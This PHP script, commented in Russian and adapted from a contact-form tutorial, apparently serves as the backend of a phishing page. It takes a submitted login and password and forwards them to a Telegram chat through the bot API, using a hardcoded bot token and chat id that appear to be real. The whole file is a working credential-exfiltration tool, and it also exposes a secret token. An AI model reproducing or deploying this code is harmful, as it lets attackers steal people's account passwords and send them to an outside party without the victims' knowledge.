<?php
 
/* https://api.telegram.org/botXXXXXXXXXXXXXXXXXXXXXXX/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */
 
//Переменная $name,$phone, $mail получает данные при помощи метода POST из формы
$login = $_POST['user_login'];
$password = $_POST['user_password'];

 
//в переменную $token нужно вставить токен, который нам прислал @botFather
$token = "1479234327:AAEV0PltZUA10kKHFyW6AGHsGgZ2GSIiJOw";
 
//нужна вставить chat_id (Как получить chad id, читайте ниже)
$chat_id = "-454241662";
 
//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  'Логин: ' => $login,
  'Пароль: ' => $password,
);
 
//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 
//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
 
//Если сообщение отправлено, напишет "Thank you", если нет - "Error"
if ($sendToTelegram) {
  echo "Thank you";
} else {
  echo "Error";
}
?>